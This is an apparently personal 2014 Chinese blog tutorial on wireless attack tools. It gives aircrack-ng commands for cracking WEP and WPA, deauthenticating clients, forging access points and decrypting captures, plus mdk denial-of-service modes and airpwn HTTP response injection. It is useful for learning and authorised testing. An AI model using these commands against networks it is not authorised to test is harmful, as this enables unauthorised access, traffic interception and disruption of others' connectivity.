---
author: wangguohao
comments: true
date: 2014-07-12 13:40:32+00:00
layout: post
title: 无线网络安全工具初探
wordpress_id: 362
categories:
- network
---

###### wifi工具包: net-wireless/aircrack-ng





	
  * airbase-ng:中间人攻击，伪造ap并且将无线的流量转发到有线网络



	
  * aircrack-ng:主要用于wep以及wpa-psk的恢复，依赖于dump的数据包，此工具就可以自动测试是否可以破解



	
  * airdecap-ng:用来解开加密状态的数据包



	
  * airdecloak-ng:用于分析无线数据报文时过滤出指定无线网络数据



	
  * airdriver-ng:用户查看工具包支持的芯片



	
  * airdrop-ng:基于策略的无线Deauth的工具



	
  * aireplay-ng:在进行wep和wap-psk的密码恢复时候，可以根据需要创建特殊的无线数据包报文



	
  * airgraph-ng



	
  * airmon-ng:网卡监控模式



	
  * airodump-ng:抓取空中传播的数据包



	
  * airolib-ng:进行wpa彩虹表攻击时使用，用于建立特定的数据库文件



	
  * airserv-ng:可以将无线网卡连接到特定端口，为攻击时灵活调用准备



	
  * airtun-ng:



	
  * besside-ng



	
  * easside-ng: 用户wep的自动破解



	
  * packetforge-ng:主要用于构造特殊的数据包，用于无客户端的破解



	
  * tkiptun-ng:主要针对wpa tkip中启用qos的网络的注入



	
  * wesside-ng


文档链接[这里 ](http://www.aircrack-ng.org/doku.php#documentation)

使用套件的一般流程



	
  * 0x01:开启网卡的监控模式


参数说明：

    
    root@kail:~/wireless# airmon-ng start waln0





	
  * 0x02:抓取无线数据帧


参数说明：-w后面是写入文件，--ivs酌情使用，-c后面是信道

    
    root@kali:~/wireless# airodump-ng -w hg -c 6 mon0





	
  * 0x03:刺激ap生成需要的数据包


wep的Request注入攻击加快有效的数据包生成

参数说明：-3 (--arpreplay)就是攻击编号，-b后面是ap的MAC，-h后面是Client的MAC

    
    root@kali:~/wireless# aireplay-ng -3 -b 9C:21:6A:7E:2C:EC -h 64:5A:04:33:75:18 mon0


wap的Deauth攻击获取wpa的握手报文：

参数说明：-0 (--deauth)就是攻击编号,后面是数据包数量，-a后面是ap的MAC，-c后面是Client的MAC

    
    root@kali:~/wireless# aireplay-ng -0 1 -a 9C:21:6A:7E:2C:EC -c 64:5A:04:33:75:18 mon0





	
  * 0x04:对密码的破解


web的破解,后面是.cap或者ivs文件

    
    root@kali:~/wireless# aircrack-ng hg-01.cap


对于wpa的破解,-w 后面是字典文件

    
    root@kali:~/wireless# aircrack-ng -w /usr/share/dictionary/words hg-01.cap





	
  * 0x05:一些辅助工具


.cap提取.ivs文件：

    
    root@kali:~/wireless# ivstools --convert hg-05.cap hg-05.ivs


把.ivs文件合成一个：

    
    root@kali:~/wireless# ivstools  --merge hg-01.ivs hg-02.ivs hg-05.ivs hg.ivs
    


解密无线数据帧，参数说明：-l 不移除802.11头部

    
    root@kali:~/wireless# airdecap-ng -l -e ESSID -p password hg-01.cap


热点伪造

    
    root@kali:~/wireless# airbase-ng -c 6 -A -Z 2 mon0


无线跳板的工具

    
    ➜  ~  airserv-ng
    
      Airserv-ng 1.2 beta3 - (C) 2007, 2008, 2009 Andrea Bittau
      http://www.aircrack-ng.org
    
      Usage: airserv-ng <options>
    
      Options:
    
           -h         : This help screen
           -p  <port> : TCP port to listen on (default:666)
           -d <iface> : Wifi interface to use
           -c  <chan> : Channel to use
           -v <level> : Debug level (1 to 3; default: 1)
    


基于策略的无线Deauth，下面策略的语法

    
    #deny rules
    d/0a:00:27:00:00:03|dc:0e:a1:f4:3f:01
    Deny    AP              Client
    #------------------
    a/any|any
    



    
    ➜  wireless  airdrop-ng -i mon0 -t hg-01.csv -r rule


对抓取的数据包内容进行过滤（其实可以在dump时候用参数指定）

    
    ➜  wireless  airdecloak-ng --bssid 0a:00:27:00:00:03 --filters signal -i hg-01.cap





###### 关于wps的:




wps 扫描工具: [这里](http://www.sourcesec.com/Lab/wps_tools.tar.gz)





wpscan.py:扫描开启的无线路由器




wpspy.py:检测wps的状态




fix:如果运行出现：Caught exception sniffing packets: global name 'sniff' is not defined解决方案，修改一下python构造包的倒入，我下面的方法是简化的，但是意思一样




    
    #!/usr/bin/env python
    
    from sys import argv, stderr, exit
    from getopt import GetoptError, getopt as GetOpt
    from scapy.all import *
    





###### 无线dos工具:net-wireless/mdk



    
    b   - Beacon Flood Mode
          Sends beacon frames to show fake APs at clients.
          This can sometimes crash network scanners and even drivers!
    a   - Authentication DoS mode
          Sends authentication frames to all APs found in range.
          Too much clients freeze or reset some APs.
    p   - Basic probing and ESSID Bruteforce mode
          Probes AP and check for answer, useful for checking if SSID has
          been correctly decloaked or if AP is in your adaptors sending range
          SSID Bruteforcing is also possible with this test mode.
    d   - Deauthentication / Disassociation Amok Mode
          Kicks everybody found from AP
    m   - Michael shutdown exploitation (TKIP)
          Cancels all traffic continuously
    x   - 802.1X tests
    w   - WIDS/WIPS Confusion
          Confuse/Abuse Intrusion Detection and Prevention Systems
    f   - MAC filter bruteforce mode
          This test uses a list of known client MAC Adresses and tries to
          authenticate them to the given AP while dynamically changing
          its response timeout for best performance. It currently works only
          on APs who deny an open authentication request properly
    g   - WPA Downgrade test
          deauthenticates Stations and APs sending WPA encrypted packets.
          With this test you can check if the sysadmin will try setting his
          network to WEP or disable encryption.
    




###### 无线欺骗net-wireless/airpwn


通过无线数据包匹配的地方修改替换掉，并且伪装为AP发送数据

    
    ➜  ~  cat /usr/share/airpwn/conf/js_html 
    begin js_html
    match ^(GET|POST)
    ignore ^GET [^ ?]+\.(jpg|jpeg|gif|png|tif|tiff)
    response /usr/share/airpwn/content/js_html


Regular expression alike

    
    airpwn -c /usr/share/airpwn/conf/greet_html -i mon0 -d mac80211 -vvv -F


针对open的，-k 参数后面可以加 wep的密码，wap没有看到参数
